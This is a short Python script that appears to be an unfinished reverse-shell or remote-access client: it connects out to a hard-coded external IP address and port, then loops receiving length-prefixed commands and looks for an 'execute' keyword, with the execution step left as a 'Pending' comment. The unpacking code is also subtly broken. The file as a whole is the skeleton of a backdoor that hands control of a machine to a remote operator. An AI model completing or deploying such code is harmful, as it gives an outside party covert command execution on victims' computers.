import socket
import os
import subprocess
from multiprocessing import Process,current_process
import struct

def start_session(s):
    while True:
        try:
            cmd = s.recv(1024)
            cmd_size = struct.unpack("<H",cmd[:2])
            cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
            if "execute" in cmd:
                cmd = cmd.strip("execute ")
                #Pending...
        except:
            pass

def main():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("142.93.197.240",2003))
    conn_process = Process(target=start_session,args=(s,))
    conn_process.start()

if __name__ == '__main__':
    main()
